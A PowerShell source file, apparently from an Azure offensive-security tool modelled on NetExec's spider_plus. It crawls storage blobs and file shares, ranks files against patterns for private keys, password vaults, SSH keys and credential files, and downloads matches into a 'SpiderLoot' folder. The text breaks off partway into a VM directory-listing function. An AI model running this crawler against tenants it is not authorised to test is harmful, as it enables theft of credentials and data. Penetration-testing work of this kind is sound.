# AZexec - Azure Storage Spider Functions
# NetExec equivalent "Spidering Shares" capability for Azure environments
# Enumerates blob containers and file shares, supports pattern-based file searching,
# and optionally downloads matching files.

# ============================================
# FILE RISK CLASSIFICATION
# ============================================

# Define sensitive file patterns by risk level
$script:SensitivePatterns = @{
    CRITICAL = @(
        # Private keys and certificates
        '\.pem$', '\.pfx$', '\.p12$', '\.key$', '\.cer$', '\.crt$', '\.der$', '\.p7b$', '\.p7c$',
        # Password managers
        '\.kdbx$', '\.kdb$', '\.agilekeychain$', '\.keychain$',
        # Sensitive keyword files
        'password', 'credential', 'secret', 'apikey', 'api_key', 'api-key', 'private',
        '\.htpasswd$', '\.netrc$', '\.pgpass$'
    )
    HIGH = @(
        # Configuration files
        '\.config$', '\.conf$', '\.ini$', '\.xml$', '\.json$', '\.yaml$', '\.yml$',
        '\.env$', '\.env\.', 'web\.config$', 'app\.config$', 'appsettings',
        # Connection strings
        'connection', 'connectionstring', 'connstr',
        # SSH files
        'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'known_hosts', 'authorized_keys',
        # Azure/AWS specific
        '\.publishsettings$', 'credentials$', '\.aws/', 'azure\.json$'
    )
    MEDIUM = @(
        # Documents
        '\.docx$', '\.doc$', '\.xlsx$', '\.xls$', '\.pptx$', '\.ppt$',
        '\.pdf$', '\.txt$', '\.csv$', '\.rtf$', '\.odt$',
        # Database
        '\.sql$', '\.bak$', '\.mdf$', '\.ldf$', '\.sqlite$', '\.db$',
        # Scripts
        '\.ps1$', '\.psm1$', '\.sh$', '\.bash$', '\.bat$', '\.cmd$', '\.vbs$'
    )
}

<#
.SYNOPSIS
    Get the risk level for a file based on its name and extension.
.DESCRIPTION
    Classifies files as CRITICAL, HIGH, MEDIUM, or LOW risk based on
    patterns matching sensitive file types.
.PARAMETER FileName
    The file name to classify.
.OUTPUTS
    String: CRITICAL, HIGH, MEDIUM, or LOW
#>
function Get-FileRiskLevel {
    param(
        [Parameter(Mandatory = $true)]
        [string]$FileName
    )

    $fileNameLower = $FileName.ToLower()

    # Check CRITICAL patterns
    foreach ($pattern in $script:SensitivePatterns.CRITICAL) {
        if ($fileNameLower -match $pattern) {
            return "CRITICAL"
        }
    }

    # Check HIGH patterns
    foreach ($pattern in $script:SensitivePatterns.HIGH) {
        if ($fileNameLower -match $pattern) {
            return "HIGH"
        }
    }

    # Check MEDIUM patterns
    foreach ($pattern in $script:SensitivePatterns.MEDIUM) {
        if ($fileNameLower -match $pattern) {
            return "MEDIUM"
        }
    }

    return "LOW"
}

<#
.SYNOPSIS
    Test if a file matches the specified pattern filter.
.DESCRIPTION
    Checks if a file name matches the comma-separated extension/keyword filter.
.PARAMETER FileName
    The file name to test.
.PARAMETER Pattern
    Comma-separated list of extensions or keywords to match (e.g., "txt,docx,key,pem").
.OUTPUTS
    Boolean indicating if the file matches the pattern.
#>
function Test-FilePatternMatch {
    param(
        [Parameter(Mandatory = $true)]
        [string]$FileName,

        [Parameter(Mandatory = $false)]
        [string]$Pattern
    )

    # If no pattern specified, match all files
    if ([string]::IsNullOrWhiteSpace($Pattern)) {
        return $true
    }

    $fileNameLower = $FileName.ToLower()
    $patterns = $Pattern.ToLower() -split ',' | ForEach-Object { $_.Trim() }

    foreach ($p in $patterns) {
        # Check if pattern matches extension (with or without dot)
        $extPattern = if ($p.StartsWith('.')) { $p } else { ".$p" }
        if ($fileNameLower.EndsWith($extPattern)) {
            return $true
        }

        # Check if pattern is contained in filename (for keyword matching)
        if ($fileNameLower -like "*$p*") {
            return $true
        }
    }

    return $false
}

<#
.SYNOPSIS
    Format file size for display.
.DESCRIPTION
    Converts bytes to human-readable format (KB, MB, GB).
.PARAMETER Bytes
    The size in bytes.
.OUTPUTS
    Formatted string (e.g., "1.5MB", "256KB").
#>
function Format-FileSize {
    param(
        [Parameter(Mandatory = $true)]
        [long]$Bytes
    )

    if ($Bytes -ge 1GB) {
        return "{0:N2}GB" -f ($Bytes / 1GB)
    } elseif ($Bytes -ge 1MB) {
        return "{0:N2}MB" -f ($Bytes / 1MB)
    } elseif ($Bytes -ge 1KB) {
        return "{0:N2}KB" -f ($Bytes / 1KB)
    } else {
        return "{0}B" -f $Bytes
    }
}

<#
.SYNOPSIS
    List all blob containers in a storage account.
.DESCRIPTION
    Enumerates blob containers using the storage account context.
.PARAMETER StorageContext
    The Azure storage context.
.PARAMETER StorageAccountName
    Name of the storage account.
.OUTPUTS
    Array of container objects.
#>
function Get-AzureBlobContainers {
    param(
        [Parameter(Mandatory = $true)]
        [object]$StorageContext,

        [Parameter(Mandatory = $true)]
        [string]$StorageAccountName
    )

    try {
        $containers = @(Get-AzStorageContainer -Context $StorageContext -ErrorAction Stop)
        return $containers
    } catch {
        Write-ColorOutput -Message "[!] Failed to list containers in $StorageAccountName : $($_.Exception.Message)" -Color "Yellow"
        return @()
    }
}

<#
.SYNOPSIS
    Recursively enumerate blobs in a container.
.DESCRIPTION
    Lists all blobs in a container with optional depth limiting.
.PARAMETER StorageContext
    The Azure storage context.
.PARAMETER ContainerName
    Name of the container.
.PARAMETER Prefix
    Optional prefix (folder path) to filter blobs.
.PARAMETER MaxDepth
    Maximum recursion depth.
.PARAMETER CurrentDepth
    Current recursion depth (internal use).
.OUTPUTS
    Array of blob objects with path information.
#>
function Get-AzureBlobsRecursive {
    param(
        [Parameter(Mandatory = $true)]
        [object]$StorageContext,

        [Parameter(Mandatory = $true)]
        [string]$ContainerName,

        [Parameter(Mandatory = $false)]
        [string]$Prefix = "",

        [Parameter(Mandatory = $false)]
        [int]$MaxDepth = 10,

        [Parameter(Mandatory = $false)]
        [int]$CurrentDepth = 0
    )

    if ($CurrentDepth -ge $MaxDepth) {
        return @()
    }

    $blobs = @()

    try {
        $blobParams = @{
            Container = $ContainerName
            Context = $StorageContext
            ErrorAction = "Stop"
        }

        if ($Prefix) {
            $blobParams.Prefix = $Prefix
        }

        $allBlobs = Get-AzStorageBlob @blobParams

        foreach ($blob in $allBlobs) {
            $blobs += [PSCustomObject]@{
                Name = $blob.Name
                BlobType = $blob.BlobType
                Length = $blob.Length
                ContentType = $blob.ContentType
                LastModified = $blob.LastModified
                FullPath = "/$ContainerName/$($blob.Name)"
            }
        }
    } catch {
        # Silently handle access denied - container may be private
    }

    return $blobs
}

<#
.SYNOPSIS
    Recursively enumerate files in an Azure File Share.
.DESCRIPTION
    Lists all files in a file share with optional depth limiting.
.PARAMETER StorageContext
    The Azure storage context.
.PARAMETER ShareName
    Name of the file share.
.PARAMETER Path
    Current directory path.
.PARAMETER MaxDepth
    Maximum recursion depth.
.PARAMETER CurrentDepth
    Current recursion depth (internal use).
.OUTPUTS
    Array of file objects with path information.
#>
function Get-AzureFileShareFilesRecursive {
    param(
        [Parameter(Mandatory = $true)]
        [object]$StorageContext,

        [Parameter(Mandatory = $true)]
        [string]$ShareName,

        [Parameter(Mandatory = $false)]
        [string]$Path = "",

        [Parameter(Mandatory = $false)]
        [int]$MaxDepth = 10,

        [Parameter(Mandatory = $false)]
        [int]$CurrentDepth = 0
    )

    if ($CurrentDepth -ge $MaxDepth) {
        return @()
    }

    $files = @()

    try {
        $itemParams = @{
            ShareName = $ShareName
            Context = $StorageContext
            ErrorAction = "Stop"
        }

        if ($Path) {
            $itemParams.Path = $Path
        }

        $items = Get-AzStorageFile @itemParams

        foreach ($item in $items) {
            if ($item.GetType().Name -eq "AzureStorageFileDirectory" -or $item.CloudFileDirectory) {
                # It's a directory - recurse
                $subPath = if ($Path) { "$Path/$($item.Name)" } else { $item.Name }
                $subFiles = Get-AzureFileShareFilesRecursive -StorageContext $StorageContext -ShareName $ShareName -Path $subPath -MaxDepth $MaxDepth -CurrentDepth ($CurrentDepth + 1)
                $files += $subFiles
            } else {
                # It's a file
                $fullPath = if ($Path) { "/$ShareName/$Path/$($item.Name)" } else { "/$ShareName/$($item.Name)" }
                $files += [PSCustomObject]@{
                    Name = $item.Name
                    Length = $item.Length
                    LastModified = $item.LastModified
                    FullPath = $fullPath
                    DirectoryPath = $Path
                }
            }
        }
    } catch {
        # Silently handle access denied
    }

    return $files
}

<#
.SYNOPSIS
    Download a blob file to the local filesystem.
.DESCRIPTION
    Downloads a blob and creates the necessary directory structure.
.PARAMETER StorageContext
    The Azure storage context.
.PARAMETER ContainerName
    Name of the container.
.PARAMETER BlobName
    Name/path of the blob.
.PARAMETER OutputFolder
    Base output folder for downloads.
.PARAMETER StorageAccountName
    Name of the storage account.
.PARAMETER MaxFileSizeMB
    Maximum file size in MB to download.
.PARAMETER FileSizeBytes
    Actual file size in bytes.
.OUTPUTS
    Boolean indicating success.
#>
function Save-SpiderBlobFile {
    param(
        [Parameter(Mandatory = $true)]
        [object]$StorageContext,

        [Parameter(Mandatory = $true)]
        [string]$ContainerName,

        [Parameter(Mandatory = $true)]
        [string]$BlobName,

        [Parameter(Mandatory = $true)]
        [string]$OutputFolder,

        [Parameter(Mandatory = $true)]
        [string]$StorageAccountName,

        [Parameter(Mandatory = $false)]
        [int]$MaxFileSizeMB = 10,

        [Parameter(Mandatory = $false)]
        [long]$FileSizeBytes = 0
    )

    # Check file size
    if ($FileSizeBytes -gt ($MaxFileSizeMB * 1MB)) {
        return $false
    }

    try {
        # Create directory structure: OutputFolder/StorageAccount/Container/path
        $relativePath = $BlobName -replace '/', [System.IO.Path]::DirectorySeparatorChar
        $destinationPath = Join-Path $OutputFolder $StorageAccountName
        $destinationPath = Join-Path $destinationPath $ContainerName
        $destinationPath = Join-Path $destinationPath $relativePath

        $destinationDir = [System.IO.Path]::GetDirectoryName($destinationPath)
        if (-not (Test-Path $destinationDir)) {
            New-Item -ItemType Directory -Path $destinationDir -Force | Out-Null
        }

        Get-AzStorageBlobContent -Container $ContainerName -Blob $BlobName -Destination $destinationPath -Context $StorageContext -Force -ErrorAction Stop | Out-Null
        return $true
    } catch {
        return $false
    }
}

<#
.SYNOPSIS
    Download a file share file to the local filesystem.
.DESCRIPTION
    Downloads a file from Azure File Shares and creates the necessary directory structure.
.PARAMETER StorageContext
    The Azure storage context.
.PARAMETER ShareName
    Name of the file share.
.PARAMETER FilePath
    Path to the file within the share.
.PARAMETER OutputFolder
    Base output folder for downloads.
.PARAMETER StorageAccountName
    Name of the storage account.
.PARAMETER MaxFileSizeMB
    Maximum file size in MB to download.
.PARAMETER FileSizeBytes
    Actual file size in bytes.
.OUTPUTS
    Boolean indicating success.
#>
function Save-SpiderShareFile {
    param(
        [Parameter(Mandatory = $true)]
        [object]$StorageContext,

        [Parameter(Mandatory = $true)]
        [string]$ShareName,

        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $true)]
        [string]$OutputFolder,

        [Parameter(Mandatory = $true)]
        [string]$StorageAccountName,

        [Parameter(Mandatory = $false)]
        [int]$MaxFileSizeMB = 10,

        [Parameter(Mandatory = $false)]
        [long]$FileSizeBytes = 0
    )

    # Check file size
    if ($FileSizeBytes -gt ($MaxFileSizeMB * 1MB)) {
        return $false
    }

    try {
        # Create directory structure: OutputFolder/StorageAccount/ShareName/path
        $relativePath = $FilePath -replace '/', [System.IO.Path]::DirectorySeparatorChar
        $destinationPath = Join-Path $OutputFolder $StorageAccountName
        $destinationPath = Join-Path $destinationPath $ShareName
        $destinationPath = Join-Path $destinationPath $relativePath

        $destinationDir = [System.IO.Path]::GetDirectoryName($destinationPath)
        if (-not (Test-Path $destinationDir)) {
            New-Item -ItemType Directory -Path $destinationDir -Force | Out-Null
        }

        Get-AzStorageFileContent -ShareName $ShareName -Path $FilePath -Destination $destinationPath -Context $StorageContext -Force -ErrorAction Stop | Out-Null
        return $true
    } catch {
        return $false
    }
}

<#
.SYNOPSIS
    Main entry point for Azure Storage spidering.
.DESCRIPTION
    Enumerates blob containers and file shares across storage accounts,
    searches for files matching patterns, and optionally downloads them.
    This is the Azure equivalent of NetExec's "spider_plus" module.
.PARAMETER ResourceGroup
    Optional resource group filter.
.PARAMETER SubscriptionId
    Optional subscription ID to target.
.PARAMETER Pattern
    Comma-separated file extension/keyword filter (e.g., "txt,docx,key,pem,pfx,config").
.PARAMETER Download
    Enable file downloading.
.PARAMETER MaxFileSize
    Maximum file size in MB to download (default: 10).
.PARAMETER OutputFolder
    Download destination folder.
.PARAMETER Depth
    Maximum recursion depth for spidering (default: 10).
.PARAMETER BlobsOnly
    Only spider blob containers.
.PARAMETER SharesOnly
    Only spider file shares.
.PARAMETER StorageAccount
    Target a specific storage account.
.PARAMETER Container
    Target a specific container or share.
.PARAMETER ExportPath
    Optional path to export results (CSV, JSON, or HTML).
#>
function Invoke-SpiderEnumeration {
    param(
        [string]$ResourceGroup,
        [string]$SubscriptionId,
        [string]$Pattern,
        [switch]$Download,
        [int]$MaxFileSize = 10,
        [string]$OutputFolder = ".\SpiderLoot",
        [int]$Depth = 10,
        [switch]$BlobsOnly,
        [switch]$SharesOnly,
        [string]$StorageAccount,
        [string]$Container,
        [string]$ExportPath
    )

    Write-ColorOutput -Message "`n[*] AZX - Azure Storage Spider" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: spider (Azure equivalent of nxc smb --spider / spider_plus)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Spidering Azure blob containers and file shares`n" -Color "Cyan"

    # Display configuration
    if ($Pattern) {
        Write-ColorOutput -Message "[*] Pattern Filter: $Pattern" -Color "Cyan"
    } else {
        Write-ColorOutput -Message "[*] Pattern Filter: None (all files)" -Color "Cyan"
    }
    if ($Download) {
        Write-ColorOutput -Message "[*] Download Mode: ENABLED" -Color "Yellow"
        Write-ColorOutput -Message "[*] Output Folder: $OutputFolder" -Color "Cyan"
        Write-ColorOutput -Message "[*] Max File Size: $MaxFileSize MB" -Color "Cyan"
    }
    Write-ColorOutput -Message "[*] Max Depth: $Depth" -Color "Cyan"
    if ($BlobsOnly) {
        Write-ColorOutput -Message "[*] Mode: Blobs Only" -Color "Cyan"
    } elseif ($SharesOnly) {
        Write-ColorOutput -Message "[*] Mode: File Shares Only" -Color "Cyan"
    } else {
        Write-ColorOutput -Message "[*] Mode: Blobs and File Shares" -Color "Cyan"
    }
    Write-Host ""

    # Initialize required modules
    $requiredModules = @('Az.Accounts', 'Az.Resources', 'Az.Storage')
    if (-not (Initialize-AzureRMModules -RequiredModules $requiredModules)) {
        return
    }

    # Connect to Azure
    $azContext = Connect-AzureRM
    if (-not $azContext) { return }

    # Get subscriptions to enumerate
    $subscriptionsToScan = Get-SubscriptionsToEnumerate -SubscriptionId $SubscriptionId -CurrentContext $azContext
    if (-not $subscriptionsToScan) { return }

    # Create output folder if downloading
    if ($Download -and -not (Test-Path $OutputFolder)) {
        New-Item -ItemType Directory -Path $OutputFolder -Force | Out-Null
        Write-ColorOutput -Message "[+] Created output folder: $OutputFolder" -Color "Green"
    }

    # Global counters
    $exportData = @()
    $totalStorageAccounts = 0
    $totalContainers = 0
    $totalFileShares = 0
    $totalFiles = 0
    $totalMatchedFiles = 0
    $totalDownloaded = 0
    $totalDownloadedSize = 0
    $criticalFiles = 0
    $highRiskFiles = 0
    $mediumRiskFiles = 0
    $skippedDueToSize = 0

    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] AZURE STORAGE SPIDER" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"

    # Loop through each subscription
    foreach ($subscription in $subscriptionsToScan) {
        if (-not (Set-SubscriptionContext -Subscription $subscription)) {
            continue
        }

        Write-ColorOutput -Message "[*] Retrieving Storage Accounts..." -Color "Yellow"

        try {
            $storageAccounts = @()
            if ($StorageAccount) {
                # Target specific storage account
                if ($ResourceGroup) {
                    $storageAccounts = @(Get-AzStorageAccount -ResourceGroupName $ResourceGroup -Name $StorageAccount -ErrorAction Stop)
                } else {
                    $storageAccounts = @(Get-AzStorageAccount -ErrorAction Stop | Where-Object { $_.StorageAccountName -eq $StorageAccount })
                }
            } elseif ($ResourceGroup) {
                $storageAccounts = @(Get-AzStorageAccount -ResourceGroupName $ResourceGroup -ErrorAction Stop)
            } else {
                $storageAccounts = @(Get-AzStorageAccount -ErrorAction Stop)
            }

            Write-ColorOutput -Message "[+] Found $($storageAccounts.Count) storage account(s)" -Color "Green"
        } catch {
            $errorMessage = $_.Exception.Message
            if ($errorMessage -like "*AuthorizationFailed*") {
                Write-ColorOutput -Message "[!] Authorization failed for subscription: $($subscription.Name)" -Color "Red"
                Write-ColorOutput -Message "[*] Skipping to next subscription...`n" -Color "Yellow"
            } else {
                Write-ColorOutput -Message "[!] Error retrieving storage accounts: $errorMessage" -Color "Red"
            }
            continue
        }

        if ($storageAccounts.Count -eq 0) {
            Write-ColorOutput -Message "[*] No storage accounts found`n" -Color "Yellow"
            continue
        }

        $totalStorageAccounts += $storageAccounts.Count

        foreach ($sa in $storageAccounts) {
            $saName = $sa.StorageAccountName
            $saRG = $sa.ResourceGroupName

            # Get storage context
            $saContext = $null
            try {
                $saContext = $sa.Context
                if (-not $saContext) {
                    try {
                        $saKeys = Get-AzStorageAccountKey -ResourceGroupName $saRG -Name $saName -ErrorAction Stop
                        $saContext = New-AzStorageContext -StorageAccountName $saName -StorageAccountKey $saKeys[0].Value -ErrorAction Stop
                    } catch {
                        try {
                            $saContext = New-AzStorageContext -StorageAccountName $saName -UseConnectedAccount -ErrorAction Stop
                        } catch {
                            Write-ColorOutput -Message "[!] Cannot access storage account: $saName" -Color "Yellow"
                            continue
                        }
                    }
                }
            } catch {
                Write-ColorOutput -Message "[!] Failed to get context for: $saName" -Color "Yellow"
                continue
            }

            $networkDefaultAction = $sa.NetworkRuleSet.DefaultAction
            $isPublic = ($networkDefaultAction -eq "Allow")

            Write-ColorOutput -Message "`n[*] STORAGE ACCOUNT: $saName" -Color "White"
            Write-ColorOutput -Message "    Resource Group: $saRG | Public: $(if ($isPublic) { 'Yes' } else { 'No' })" -Color "Gray"

            # Spider Blob Containers
            if (-not $SharesOnly) {
                try {
                    $containers = Get-AzureBlobContainers -StorageContext $saContext -StorageAccountName $saName

                    if ($Container) {
                        $containers = $containers | Where-Object { $_.Name -eq $Container }
                    }

                    if ($containers.Count -gt 0) {
                        $totalContainers += $containers.Count
                        Write-ColorOutput -Message "    [*] Blob Containers: $($containers.Count)" -Color "Cyan"

                        foreach ($cont in $containers) {
                            $contName = $cont.Name
                            $publicAccess = $cont.PublicAccess
                            $isContPublic = $publicAccess -ne "Off" -and $publicAccess -ne $null

                            Write-ColorOutput -Message "        Container: $contName (Public: $(if ($isContPublic) { $publicAccess } else { 'No' }))" -Color "Gray"

                            # Get blobs recursively
                            $blobs = Get-AzureBlobsRecursive -StorageContext $saContext -ContainerName $contName -MaxDepth $Depth

                            foreach ($blob in $blobs) {
                                $totalFiles++
                                $fileName = [System.IO.Path]::GetFileName($blob.Name)

                                # Check pattern match
                                $isMatch = Test-FilePatternMatch -FileName $fileName -Pattern $Pattern

                                if ($isMatch) {
                                    $totalMatchedFiles++
                                    $riskLevel = Get-FileRiskLevel -FileName $fileName
                                    $sizeFormatted = Format-FileSize -Bytes $blob.Length

                                    # Track risk levels
                                    switch ($riskLevel) {
                                        "CRITICAL" { $criticalFiles++ }
                                        "HIGH" { $highRiskFiles++ }
                                        "MEDIUM" { $mediumRiskFiles++ }
                                    }

                                    # Determine display color
                                    $riskColor = switch ($riskLevel) {
                                        "CRITICAL" { "Red" }
                                        "HIGH" { "Yellow" }
                                        "MEDIUM" { "Cyan" }
                                        default { "Gray" }
                                    }

                                    $matchTag = if ($Pattern) { "[MATCH]" } else { "" }
                                    $riskTag = if ($riskLevel -ne "LOW") { "[$riskLevel]" } else { "" }

                                    # NetExec-style output
                                    Write-Host "        AZR    " -NoNewline -ForegroundColor "Magenta"
                                    Write-Host "$($saName.PadRight(20)) " -NoNewline
                                    Write-Host "443    " -NoNewline
                                    Write-Host "$($blob.FullPath.PadRight(50)) " -NoNewline
                                    if ($riskTag) {
                                        Write-Host "$riskTag " -NoNewline -ForegroundColor $riskColor
                                    }
                                    if ($matchTag) {
                                        Write-Host "$matchTag " -NoNewline -ForegroundColor "Green"
                                    }
                                    Write-Host "Size: $sizeFormatted" -ForegroundColor "Gray"

                                    # Download if enabled
                                    $downloaded = $false
                                    if ($Download) {
                                        if ($blob.Length -le ($MaxFileSize * 1MB)) {
                                            $downloaded = Save-SpiderBlobFile -StorageContext $saContext -ContainerName $contName -BlobName $blob.Name -OutputFolder $OutputFolder -StorageAccountName $saName -MaxFileSizeMB $MaxFileSize -FileSizeBytes $blob.Length
                                            if ($downloaded) {
                                                $totalDownloaded++
                                                $totalDownloadedSize += $blob.Length
                                            }
                                        } else {
                                            $skippedDueToSize++
                                        }
                                    }

                                    # Add to export data
                                    $exportData += [PSCustomObject]@{
                                        Subscription = $subscription.Name
                                        SubscriptionId = $subscription.Id
                                        StorageAccount = $saName
                                        ResourceGroup = $saRG
                                        Type = "Blob"
                                        ContainerOrShare = $contName
                                        FilePath = $blob.FullPath
                                        FileName = $fileName
                                        SizeBytes = $blob.Length
                                        SizeFormatted = $sizeFormatted
                                        RiskLevel = $riskLevel
                                        LastModified = $blob.LastModified
                                        ContentType = $blob.ContentType
                                        PublicAccess = $isContPublic
                                        Downloaded = $downloaded
                                        PatternMatched = $true
                                    }
                                }
                            }
                        }
                    }
                } catch {
                    Write-ColorOutput -Message "    [!] Error accessing blob containers" -Color "Yellow"
                }
            }

            # Spider File Shares
            if (-not $BlobsOnly) {
                try {
                    $shares = @(Get-AzStorageShare -Context $saContext -ErrorAction Stop)

                    if ($Container) {
                        $shares = $shares | Where-Object { $_.Name -eq $Container }
                    }

                    if ($shares.Count -gt 0) {
                        $totalFileShares += $shares.Count
                        Write-ColorOutput -Message "    [*] File Shares: $($shares.Count)" -Color "Cyan"

                        foreach ($share in $shares) {
                            $shareName = $share.Name
                            Write-ColorOutput -Message "        Share: $shareName" -Color "Gray"

                            # Get files recursively
                            $files = Get-AzureFileShareFilesRecursive -StorageContext $saContext -ShareName $shareName -MaxDepth $Depth

                            foreach ($file in $files) {
                                $totalFiles++
                                $fileName = $file.Name

                                # Check pattern match
                                $isMatch = Test-FilePatternMatch -FileName $fileName -Pattern $Pattern

                                if ($isMatch) {
                                    $totalMatchedFiles++
                                    $riskLevel = Get-FileRiskLevel -FileName $fileName
                                    $sizeFormatted = Format-FileSize -Bytes $file.Length

                                    # Track risk levels
                                    switch ($riskLevel) {
                                        "CRITICAL" { $criticalFiles++ }
                                        "HIGH" { $highRiskFiles++ }
                                        "MEDIUM" { $mediumRiskFiles++ }
                                    }

                                    # Determine display color
                                    $riskColor = switch ($riskLevel) {
                                        "CRITICAL" { "Red" }
                                        "HIGH" { "Yellow" }
                                        "MEDIUM" { "Cyan" }
                                        default { "Gray" }
                                    }

                                    $matchTag = if ($Pattern) { "[MATCH]" } else { "" }
                                    $riskTag = if ($riskLevel -ne "LOW") { "[$riskLevel]" } else { "" }

                                    # NetExec-style output
                                    Write-Host "        AZR    " -NoNewline -ForegroundColor "Magenta"
                                    Write-Host "$($saName.PadRight(20)) " -NoNewline
                                    Write-Host "443    " -NoNewline
                                    Write-Host "$($file.FullPath.PadRight(50)) " -NoNewline
                                    if ($riskTag) {
                                        Write-Host "$riskTag " -NoNewline -ForegroundColor $riskColor
                                    }
                                    if ($matchTag) {
                                        Write-Host "$matchTag " -NoNewline -ForegroundColor "Green"
                                    }
                                    Write-Host "Size: $sizeFormatted" -ForegroundColor "Gray"

                                    # Download if enabled
                                    $downloaded = $false
                                    if ($Download) {
                                        $filePath = if ($file.DirectoryPath) { "$($file.DirectoryPath)/$fileName" } else { $fileName }
                                        if ($file.Length -le ($MaxFileSize * 1MB)) {
                                            $downloaded = Save-SpiderShareFile -StorageContext $saContext -ShareName $shareName -FilePath $filePath -OutputFolder $OutputFolder -StorageAccountName $saName -MaxFileSizeMB $MaxFileSize -FileSizeBytes $file.Length
                                            if ($downloaded) {
                                                $totalDownloaded++
                                                $totalDownloadedSize += $file.Length
                                            }
                                        } else {
                                            $skippedDueToSize++
                                        }
                                    }

                                    # Add to export data
                                    $exportData += [PSCustomObject]@{
                                        Subscription = $subscription.Name
                                        SubscriptionId = $subscription.Id
                                        StorageAccount = $saName
                                        ResourceGroup = $saRG
                                        Type = "FileShare"
                                        ContainerOrShare = $shareName
                                        FilePath = $file.FullPath
                                        FileName = $fileName
                                        SizeBytes = $file.Length
                                        SizeFormatted = $sizeFormatted
                                        RiskLevel = $riskLevel
                                        LastModified = $file.LastModified
                                        ContentType = "N/A"
                                        PublicAccess = $false
                                        Downloaded = $downloaded
                                        PatternMatched = $true
                                    }
                                }
                            }
                        }
                    }
                } catch {
                    # File shares may not be accessible
                }
            }
        }

        Write-ColorOutput -Message "`n[*] Subscription enumeration complete" -Color "Green"
    }

    # Spider Summary
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] SPIDER SUMMARY" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"

    Write-ColorOutput -Message "[*] Storage Accounts: $totalStorageAccounts | Containers: $totalContainers | File Shares: $totalFileShares" -Color "White"
    Write-ColorOutput -Message "[*] Total Files Scanned: $totalFiles" -Color "White"
    Write-ColorOutput -Message "[*] Pattern Matches: $totalMatchedFiles" -Color $(if ($totalMatchedFiles -gt 0) { "Green" } else { "Gray" })

    Write-ColorOutput -Message "`n[*] RISK BREAKDOWN:" -Color "Yellow"
    Write-ColorOutput -Message "    Critical Files: $criticalFiles" -Color $(if ($criticalFiles -gt 0) { "Red" } else { "Green" })
    Write-ColorOutput -Message "    High Risk Files: $highRiskFiles" -Color $(if ($highRiskFiles -gt 0) { "Yellow" } else { "Green" })
    Write-ColorOutput -Message "    Medium Risk Files: $mediumRiskFiles" -Color $(if ($mediumRiskFiles -gt 0) { "Cyan" } else { "Green" })

    if ($Download) {
        $downloadedSizeFormatted = Format-FileSize -Bytes $totalDownloadedSize
        Write-ColorOutput -Message "`n[*] DOWNLOAD SUMMARY:" -Color "Yellow"
        Write-ColorOutput -Message "    Downloaded: $totalDownloaded files ($downloadedSizeFormatted)" -Color "Green"
        Write-ColorOutput -Message "    Skipped (size limit): $skippedDueToSize files" -Color "Gray"
        Write-ColorOutput -Message "    Output Folder: $OutputFolder" -Color "Cyan"
    }

    # Export if requested
    if ($ExportPath) {
        $stats = @{
            "Subscriptions Scanned" = $subscriptionsToScan.Count
            "Storage Accounts" = $totalStorageAccounts
            "Blob Containers" = $totalContainers
            "File Shares" = $totalFileShares
            "Total Files" = $totalFiles
            "Pattern Matches" = $totalMatchedFiles
            "Critical Files (HIGH RISK)" = $criticalFiles
            "High Risk Files" = $highRiskFiles
            "Downloaded" = $totalDownloaded
        }
        Export-EnumerationResults -Data $exportData -ExportPath $ExportPath -Title "Azure Storage Spider" -Statistics $stats -CommandName "spider" -Description "Azure equivalent of NetExec spider_plus module. Spidering Azure blob containers and file shares for sensitive files."
    }

    # NetExec comparison
    Write-ColorOutput -Message "`n[*] NETEXEC COMPARISON:" -Color "Yellow"
    Write-ColorOutput -Message "    NetExec: nxc smb 192.168.1.0/24 -u user -p pass --spider" -Color "Gray"
    Write-ColorOutput -Message "    AZexec:  .\azx.ps1 spider" -Color "Gray"
    Write-ColorOutput -Message "`n    NetExec: nxc smb IP -M spider_plus -o DOWNLOAD_FLAG=True" -Color "Gray"
    Write-ColorOutput -Message "    AZexec:  .\azx.ps1 spider -Download -OutputFolder C:\\Loot" -Color "Gray"

    # Security recommendations
    if ($criticalFiles -gt 0 -or $highRiskFiles -gt 0) {
        Write-ColorOutput -Message "`n[*] SECURITY RECOMMENDATIONS:" -Color "Cyan"
        Write-ColorOutput -Message "    - Review CRITICAL and HIGH risk files for sensitive data exposure" -Color "Cyan"
        Write-ColorOutput -Message "    - Ensure proper access controls on storage accounts" -Color "Cyan"
        Write-ColorOutput -Message "    - Use Azure Private Endpoints for sensitive storage" -Color "Cyan"
        Write-ColorOutput -Message "    - Enable Azure Defender for Storage" -Color "Cyan"
    }

    return $exportData
}

# ============================================
# VM SPIDER FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Get directory listing from a VM via remote execution.
.DESCRIPTION
    Executes a directory enumeration script on the VM and parses the output.
    Supports both Windows (Get-ChildItem) and Linux (find) VMs.
.PARAMETER VMName
    Name of the target VM.
.PARAMETER ResourceGroup
    Resource group containing the VM.
.PARAMETER OSType
    Operating system type (Windows or Linux).
.PARAMETER StartPath
    Starting directory path to enumerate.
.PARAMETER ExcludePaths
    Comma-separated list of paths to exclude.
.PARAMETER MaxDepth
    Maximum recursion depth.
.OUTPUTS
    Array of file objects with path, size, and date information.
#>
function Get-VMDirectoryListing {
    param(
        [Parameter(Mandatory = $true)]
        [string]$VMName,

        [Parameter(Mandatory = $true)]
        [string]$ResourceGroup,

        [Parameter(Mandatory = $true)]
        [string]$OSType,

        [Parameter(Mandatory = $false)]
        [string]$StartPath,

        [Parameter(Mandatory = $false)]
        [string]$ExcludePaths,

        [Parameter(Mandatory = $false)]
        [int]$MaxDepth = 10
    )

    $files = @()

    # Set default start path based on OS
    if ([string]::IsNullOrWhiteSpace($StartPath)) {
        $StartPath = if ($OSType -eq "Windows") { "C:\" } else { "/" }
    }

    # Build the enumeration script
    if ($OSType -eq "Windows") {
        # Windows PowerShell script
        $excludeFilter = ""
        if (-not [string]::IsNullOrWhiteSpace($ExcludePaths)) {
            $excludePaths = $ExcludePaths -split ',' | ForEach-Object { $_.Trim() }
            $excludeFilter = " | Where-Object { " + (($excludePaths | ForEach-Object { "`$_.FullName -notlike '*$_*'" }) -join ' -and ') + " }"
        }

        $script = @"
`$ErrorActionPreference = 'SilentlyContinue'
